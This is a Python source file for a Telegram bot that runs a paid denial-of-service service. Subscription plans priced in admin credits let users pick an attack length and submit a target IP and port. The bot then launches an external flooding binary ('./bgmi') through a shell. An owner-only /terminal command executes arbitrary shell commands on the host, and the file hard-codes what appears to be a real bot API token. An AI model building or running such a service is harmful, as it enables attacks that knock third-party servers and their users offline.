import telebot
from telebot import types
import subprocess
import re
import time
import platform
from datetime import datetime
import logging
import threading
import time
import logging

# Configure logging
logging.basicConfig(level=logging.INFO)

# Bot configuration
API_TOKEN = '8006244049:AAHF2Ae4ckHXVFVC4FJmRe8BE-MaggGxpBM'  # Replace with your bot token
OWNER_ID = 5730843286  # Replace with your Telegram user ID

bot = telebot.TeleBot(API_TOKEN)

# Function to print a message every 30 seconds
def print_status():
    while True:
        print("Bot is still running...")
        time.sleep(170)

# Start the background thread
status_thread = threading.Thread(target=print_status, daemon=True)
status_thread.start()

# Global data structures
approved_users = set()   # Users approved to use the bot (by having an assigned plan)
blocked_users = set()    # Blocked users
admin_info = {}          # Admin info: {admin_id: credits}
user_plans = {}          # User plans: {user_id: {"plan": PLAN_NAME, "expiry": timestamp}}
attack_logs = []         # List of attack logs
start_time = time.time() # Bot uptime reference

# Plan settings
plan_expiry = {
    "Basic": 1 * 24 * 3600,      # 1 day
    "Standard": 3 * 24 * 3600,   # 3 days
    "Pro": 7 * 24 * 3600,        # 1 week
    "VIP": 30 * 24 * 3600        # 1 month (approx)
}
plan_cost = {
    "Basic": 2,
    "Standard": 5,
    "Pro": 10,
    "VIP": 20
}

# Attack duration mapping (the keys are used for buttons)
# "1" => 2 minutes, "2" => 3 minutes, "3" => 4 minutes, "4" => 5 minutes, "5" => 5 minutes (max)
attack_duration_mapping = {
    "1": 2,
    "2": 3,
    "3": 4,
    "4": 5,
    "5": 5
}

# Allowed duration buttons per plan.
# For example, Basic plan users can only choose buttons "1", "2", "3" (i.e. 2,3,4 minutes)
allowed_durations = {
    "Basic": ["1", "2", "3"],
    "Standard": ["1", "2", "3", "4"],
    "Pro": ["1", "2", "3", "4", "5"],
    "VIP": ["1", "2", "3", "4", "5"]
}

# Dictionary to temporarily store pending attack selections.
# pending_attacks[chat_id] = {"duration_key": <key>, "duration_minutes": <minutes>}
pending_attacks = {}

##############################
#    ERROR HANDLING DECORATOR
##############################

def safe_handler(func):
    """
    Decorator to catch exceptions in command handlers.
    If an error occurs, a friendly error message is sent to the user,
    and the error is logged.
    """
    def wrapper(message, *args, **kwargs):
        try:
            return func(message, *args, **kwargs)
        except Exception as e:
            bot.send_message(message.chat.id, "❌ An unexpected error occurred. Please try again later.")
            logging.exception(f"Error in {func.__name__}: {e}")
    return wrapper

##############################
#       USER COMMANDS        #
##############################

@bot.message_handler(commands=['start'])
@safe_handler
def start_command(message):
    if message.chat.id in blocked_users:
        bot.send_message(message.chat.id, "❌ You are blocked from using this bot.")
        return
    if message.chat.id not in user_plans:
        bot.send_message(message.chat.id, "❌ You do not have an assigned plan. Please contact an admin.")
        return
    plan = user_plans[message.chat.id]['plan']
    bot.send_message(
        message.chat.id,
        f"👋 Welcome! Your assigned plan is *{plan}*.\n\n"
        "To launch an attack, use the /attack command.\n"
        "Example usage:\n"
        "1. Send /attack\n"
        "2. Click one of the duration buttons (2 min, 3 min, etc.)\n"
        "3. Then send the target as: <IP> <PORT> (e.g., 192.168.1.1 8080)",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=['my_plan'])
@safe_handler
def my_plan(message):
    if message.chat.id in user_plans:
        plan = user_plans[message.chat.id]['plan']
        expiry = user_plans[message.chat.id]['expiry']
        expiry_str = datetime.fromtimestamp(expiry).strftime("%Y-%m-%d %H:%M:%S")
        bot.send_message(message.chat.id, f"✅ Your plan is <b>{plan}</b> and it expires on <b>{expiry_str}</b>.", parse_mode="HTML")
    else:
        bot.send_message(message.chat.id, "❌ You do not have an assigned plan.")

##############################
#           HELP             #
##############################

@bot.message_handler(commands=['help'])
@safe_handler
def help_command(message):
    # Role-based help message using HTML formatting
    if message.chat.id == OWNER_ID:
        help_text = (
            "<b>📜 Owner Commands:</b>\n"
            "/make_admin USER_ID - Promote a user to admin\n"
            "/remove_admin USER_ID - Remove admin access\n"
            "/add_credits ADMIN_ID AMOUNT - Add credits to an admin\n"
            "/remove_credits ADMIN_ID AMOUNT - Remove credits from an admin\n"
            "/list_admins - List all admins with credits\n\n"
            "<b>🛠️ Admin Commands:</b>\n"
            "/set_plan USER_ID PLAN_NAME - Assign a plan to a user (Plan names: Basic, Standard, Pro, VIP)\n"
            "/remove_plan USER_ID - Remove a user's plan\n"
            "/list_users - List users with their assigned plans\n"
            "/my_credits - Check your admin credits\n\n"
            "<b>🚀 User Commands:</b>\n"
            "/start - Start the bot and view your plan commands\n"
            "/my_plan - Check your assigned plan\n"
            "/attack - Launch an attack via inline buttons\n"
            "/allplan - View all available plans and credit costs\n\n"
            "<b>Example for /attack:</b>\n"
            "1. Send /attack\n"
            "2. Tap the button for the desired duration (e.g., 2 min)\n"
            "3. Then send the target as: 192.168.1.1 8080"
        )
    elif message.chat.id in admin_info:
        help_text = (
            "<b>🛠️ Admin Commands:</b>\n"
            "/set_plan USER_ID PLAN_NAME - Assign a plan to a user (Plan names: Basic, Standard, Pro, VIP)\n"
            "/remove_plan USER_ID - Remove a user's plan\n"
            "/list_users - List users with their assigned plans\n"
            "/my_credits - Check your admin credits\n\n"
            "<b>🚀 User Commands:</b>\n"
            "/start - Start the bot and view your plan commands\n"
            "/my_plan - Check your assigned plan\n"
            "/attack - Launch an attack via inline buttons\n"
            "/allplan - View all available plans and credit costs\n\n"
            "<b>Example for /attack:</b>\n"
            "1. Send /attack\n"
            "2. Tap the button for the desired duration (e.g., 3 min)\n"
            "3. Then send the target as: 192.168.1.1 8080"
        )
    else:
        help_text = (
            "<b>🚀 User Commands:</b>\n"
            "/start - Start the bot and view your plan commands\n"
            "/my_plan - Check your assigned plan\n"
            "/attack - Launch an attack via inline buttons\n"
            "/allplan - View all available plans and credit costs\n\n"
            "<b>Example for /attack:</b>\n"
            "1. Send /attack\n"
            "2. Tap the button for the desired duration (e.g., 2 min)\n"
            "3. Then send the target as: 192.168.1.1 8080"
        )
    bot.send_message(message.chat.id, help_text, parse_mode="HTML")

##############################
#         ALL PLAN           #
##############################

@bot.message_handler(commands=['allplan'])
@safe_handler
def all_plan(message):
    # Build a message listing all plans with their duration (in days) and credit cost
    msg = "<b>📋 Available Plans:</b>\n\n"
    for plan in plan_expiry:
        # Convert seconds to days for display
        duration_days = plan_expiry[plan] // (24 * 3600)
        cost = plan_cost[plan]
        day_text = "day" if duration_days == 1 else "days"
        msg += f"• <b>{plan}</b>: Duration: {duration_days} {day_text}, Cost: {cost} credits\n"
    bot.send_message(message.chat.id, msg, parse_mode="HTML")

##############################
#    OWNER COMMANDS          #
##############################

@bot.message_handler(commands=['make_admin'])
@safe_handler
def make_admin(message):
    if message.chat.id != OWNER_ID:
        bot.send_message(message.chat.id, "❌ Only the owner can make admins.")
        return
    try:
        parts = message.text.split()
        user_id = int(parts[1])
        # Add the user to admin_info with default 0 credits
        admin_info[user_id] = admin_info.get(user_id, 0)
        bot.send_message(OWNER_ID, f"✅ User {user_id} is now an admin with {admin_info[user_id]} credits.")
        bot.send_message(user_id, "✅ You have been promoted to admin by the owner.")
    except Exception:
        bot.send_message(OWNER_ID, "❌ Invalid format. Use: /make_admin USER_ID")

@bot.message_handler(commands=['remove_admin'])
@safe_handler
def remove_admin(message):
    if message.chat.id != OWNER_ID:
        bot.send_message(message.chat.id, "❌ Only the owner can remove admins.")
        return
    try:
        parts = message.text.split()
        user_id = int(parts[1])
        if user_id in admin_info:
            del admin_info[user_id]
            bot.send_message(OWNER_ID, f"✅ Admin {user_id} has been removed.")
            bot.send_message(user_id, "❌ Your admin privileges have been removed by the owner.")
        else:
            bot.send_message(OWNER_ID, "❌ That user is not an admin.")
    except Exception:
        bot.send_message(OWNER_ID, "❌ Invalid format. Use: /remove_admin USER_ID")

@bot.message_handler(commands=['add_credits'])
@safe_handler
def add_credits(message):
    if message.chat.id != OWNER_ID:
        bot.send_message(message.chat.id, "❌ Only the owner can add credits.")
        return
    try:
        parts = message.text.split()
        admin_id = int(parts[1])
        amount = int(parts[2])
        admin_info[admin_id] = admin_info.get(admin_id, 0) + amount
        bot.send_message(OWNER_ID, f"✅ Added {amount} credits to admin {admin_id}. Now they have {admin_info[admin_id]} credits.")
    except Exception:
        bot.send_message(OWNER_ID, "❌ Invalid format. Use: /add_credits ADMIN_ID AMOUNT")

@bot.message_handler(commands=['remove_credits'])
@safe_handler
def remove_credits(message):
    if message.chat.id != OWNER_ID:
        bot.send_message(message.chat.id, "❌ Only the owner can remove credits.")
        return
    try:
        parts = message.text.split()
        admin_id = int(parts[1])
        amount = int(parts[2])
        if admin_id in admin_info:
            admin_info[admin_id] = max(0, admin_info[admin_id] - amount)
            bot.send_message(OWNER_ID, f"✅ Removed {amount} credits from admin {admin_id}. Now they have {admin_info[admin_id]} credits.")
        else:
            bot.send_message(OWNER_ID, "❌ That user is not an admin.")
    except Exception:
        bot.send_message(OWNER_ID, "❌ Invalid format. Use: /remove_credits ADMIN_ID AMOUNT")

@bot.message_handler(commands=['list_admins'])
@safe_handler
def list_admins(message):
    if message.chat.id != OWNER_ID:
        bot.send_message(message.chat.id, "❌ Only the owner can list admins.")
        return
    if admin_info:
        msg = "<b>📋 Admins and their Credits:</b>\n"
        for aid, credits in admin_info.items():
            msg += f"User {aid}: {credits} credits\n"
        bot.send_message(OWNER_ID, msg, parse_mode="HTML")
    else:
        bot.send_message(OWNER_ID, "📜 No admins available.")

##############################
#     ADMIN COMMANDS         #
##############################

@bot.message_handler(commands=['set_plan'])
@safe_handler
def set_plan(message):
    # Format: /set_plan USER_ID PLAN_NAME
    if message.chat.id not in admin_info and message.chat.id != OWNER_ID:
        bot.send_message(message.chat.id, "❌ Only admins can assign plans.")
        return
    try:
        parts = message.text.split()
        user_id = int(parts[1])
        plan_name = parts[2].capitalize()
        if plan_name not in plan_expiry:
            bot.send_message(message.chat.id, "❌ Invalid plan name. Options: Basic, Standard, Pro, VIP.")
            return
        cost = plan_cost[plan_name]
        # If not owner, check admin credits
        if message.chat.id != OWNER_ID:
            if admin_info.get(message.chat.id, 0) < cost:
                bot.send_message(message.chat.id, "❌ Not enough credits to assign this plan.")
                return
            else:
                admin_info[message.chat.id] -= cost
        expiry = time.time() + plan_expiry[plan_name]
        user_plans[user_id] = {"plan": plan_name, "expiry": expiry}
        approved_users.add(user_id)
        expiry_str = datetime.fromtimestamp(expiry).strftime("%Y-%m-%d %H:%M:%S")
        bot.send_message(message.chat.id, f"✅ Assigned {plan_name} plan to user {user_id}. Expires on {expiry_str}.")
        bot.send_message(user_id, f"✅ You have been assigned the <b>{plan_name}</b> plan. It expires on <b>{expiry_str}</b>.", parse_mode="HTML")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {str(e)}\nUsage: /set_plan USER_ID PLAN_NAME")

@bot.message_handler(commands=['remove_plan'])
@safe_handler
def remove_plan(message):
    if message.chat.id not in admin_info and message.chat.id != OWNER_ID:
        bot.send_message(message.chat.id, "❌ Only admins can remove plans.")
        return
    try:
        parts = message.text.split()
        user_id = int(parts[1])
        if user_id in user_plans:
            del user_plans[user_id]
            approved_users.discard(user_id)
            bot.send_message(message.chat.id, f"✅ Removed plan for user {user_id}.")
            bot.send_message(user_id, "❌ Your plan has been removed by an admin.")
        else:
            bot.send_message(message.chat.id, "❌ User does not have an assigned plan.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {str(e)}\nUsage: /remove_plan USER_ID")

@bot.message_handler(commands=['list_users'])
@safe_handler
def list_users(message):
    if message.chat.id not in admin_info and message.chat.id != OWNER_ID:
        bot.send_message(message.chat.id, "❌ Only admins can list users.")
        return
    if user_plans:
        msg = "<b>📋 Users with Plans:</b>\n"
        for uid, info in user_plans.items():
            expiry_str = datetime.fromtimestamp(info['expiry']).strftime("%Y-%m-%d %H:%M:%S")
            msg += f"User {uid}: {info['plan']} (Expires: {expiry_str})\n"
        bot.send_message(message.chat.id, msg, parse_mode="HTML")
    else:
        bot.send_message(message.chat.id, "📜 No users have an assigned plan.")

@bot.message_handler(commands=['my_credits'])
@safe_handler
def my_credits(message):
    if message.chat.id in admin_info:
        bot.send_message(message.chat.id, f"💰 You have {admin_info[message.chat.id]} credits.")
    else:
        bot.send_message(message.chat.id, "❌ You are not an admin.")

##############################
#      ATTACK (INLINE)       #
##############################

# New /attack command: shows inline buttons for allowed durations.
@bot.message_handler(commands=['attack'])
@safe_handler
def attack_command(message):
    if message.chat.id in blocked_users:
        bot.send_message(message.chat.id, "❌ You are blocked from using this bot.")
        return
    if message.chat.id not in user_plans:
        bot.send_message(message.chat.id, "❌ You do not have an assigned plan. Please contact an admin.")
        return

    user_plan = user_plans[message.chat.id]['plan']
    # Get allowed duration keys for the user's plan.
    allowed = allowed_durations.get(user_plan, [])
    if not allowed:
        bot.send_message(message.chat.id, "❌ Your plan does not support any attack durations.")
        return

    markup = types.InlineKeyboardMarkup()
    # Create a button for each allowed duration.
    for key in allowed:
        minutes = attack_duration_mapping.get(key)
        # Create a button with callback data "attack_duration:<key>"
        button = types.InlineKeyboardButton(text=f"{minutes} min", callback_data=f"attack_duration:{key}")
        markup.add(button)

    bot.send_message(message.chat.id,
                     "🚀 Choose your attack duration by clicking one of the buttons below:",
                     reply_markup=markup)

# Callback query handler for the attack duration buttons.
@bot.callback_query_handler(func=lambda call: call.data.startswith("attack_duration:"))
def handle_attack_duration(call):
    chat_id = call.message.chat.id
    # Ensure the user has an assigned plan.
    if chat_id not in user_plans:
        bot.answer_callback_query(call.id, "❌ You do not have an assigned plan.")
        return

    user_plan = user_plans[chat_id]['plan']
    allowed = allowed_durations.get(user_plan, [])
    duration_key = call.data.split(":")[1]
    if duration_key not in allowed:
        bot.answer_callback_query(call.id, "❌ This duration is not allowed for your plan.")
        return

    duration_minutes = attack_duration_mapping.get(duration_key)
    # Save the pending attack selection.
    pending_attacks[chat_id] = {"duration_key": duration_key, "duration_minutes": duration_minutes}

    bot.answer_callback_query(call.id, f"Selected duration: {duration_minutes} min")
    bot.send_message(chat_id,
                     f"✅ You selected a {duration_minutes}-minute attack.\n"
                     "Now send the target in the following format:\n"
                     "<IP> <PORT>\n"
                     "Example: 192.168.1.1 8080")

# Message handler to capture the target (IP and PORT) for a pending attack.
@bot.message_handler(func=lambda m: m.chat.id in pending_attacks)
@safe_handler
def process_attack_target(message):
    chat_id = message.chat.id
    text = message.text.strip()
    parts = text.split()
    if len(parts) != 2:
        bot.send_message(chat_id, "❌ Invalid format. Please send target as: <IP> <PORT>\nExample: 192.168.1.1 8080")
        return

    ip = parts[0]
    port = parts[1]

    # Validate IP and port.
    ip_pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
    if not ip_pattern.match(ip) or not (port.isdigit() and 1 <= int(port) <= 65535):
        bot.send_message(chat_id, "❌ Invalid IP or port. Please use the format: 192.168.1.1 8080")
        return

    duration_minutes = pending_attacks[chat_id]["duration_minutes"]
    duration_seconds = duration_minutes * 60

    # Remove the pending attack selection.
    del pending_attacks[chat_id]

    # Build and execute the attack command.
    command_line = f"./bgmi {ip} {port} {duration_seconds} 1800"
    try:
        subprocess.Popen(command_line, shell=True)
        bot.send_message(
            chat_id,
            f"🚀 **Attack Initiated!**\n\n"
            f"🎯 **Target:** `{ip}:{port}`\n"
            f"⏳ **Duration:** `{duration_minutes} minutes`\n"
            f"⚡ **Status:** Attack launched successfully!\n\n"
            f"📡 **Stay Tuned:** You will be notified when the attack ends.",
            parse_mode="Markdown"
        )
        # Notify owner
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            user_info = bot.get_chat(chat_id)
            username = user_info.username if user_info.username else f"User {chat_id}"
        except Exception:
            username = f"User {chat_id}"
        owner_message = (
            f"⚠️ **Attack Alert!** ⚠️\n"
            f"👤 **User:** @{username}\n"
            f"🎯 **Target:** `{ip}:{port}`\n"
            f"⏳ **Duration:** `{duration_minutes} minutes`\n"
            f"🕒 **Time:** `{timestamp}`\n\n"
            f"📢 **Action:** Attack launched!"
        )
        bot.send_message(OWNER_ID, owner_message, parse_mode="Markdown")
        # Log the attack
        attack_logs.append(f"{timestamp} - User {chat_id} attacked {ip}:{port} for {duration_minutes} minutes.")
        # Schedule notification when the attack ends
        def notify_end(chat_id, ip, port, duration_minutes):
            time.sleep(duration_minutes * 60)
            bot.send_message(
                chat_id,
                f"✅ **Attack Completed!**\nTarget `{ip}:{port}` was attacked for `{duration_minutes} minutes`.",
                parse_mode="Markdown"
            )
        threading.Thread(target=notify_end, args=(chat_id, ip, port, duration_minutes)).start()
    except Exception as e:
        bot.send_message(chat_id, f"❌ Error executing attack: {str(e)}")

##############################
#     OWNER TERMINAL COMMAND #
##############################

@bot.message_handler(commands=['terminal'])
@safe_handler
def terminal_command(message):
    # This command is restricted to the owner only.
    if message.chat.id != OWNER_ID:
        bot.send_message(message.chat.id, "❌ You are not authorized to use this command.")
        return

    # Extract the command to execute
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.send_message(message.chat.id, "❌ Usage: /terminal <command>")
        return

    terminal_cmd = parts[1]
    try:
        # Execute the terminal command and capture the output.
        result = subprocess.run(terminal_cmd, shell=True, capture_output=True, text=True, timeout=60)
        output = result.stdout + result.stderr
        if not output:
            output = "✅ Command executed successfully with no output."
        # Send back the output (limit output length if necessary)
        if len(output) > 4000:
            output = output[:4000] + "\n\n...Output truncated."
        bot.send_message(message.chat.id, f"📥 <code>{output}</code>", parse_mode="HTML")
    except subprocess.TimeoutExpired:
        bot.send_message(message.chat.id, "❌ Command timed out.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error executing command: {str(e)}")

##############################
#       BOT POLLING          #
##############################

if __name__ == "__main__":
    print("Bot is starting...")
    try:
        bot.polling(none_stop=True)  # Keeps the bot running
    except Exception as e:
        print(f"Error: {e}")
        time.sleep(5)  # Wait before retrying
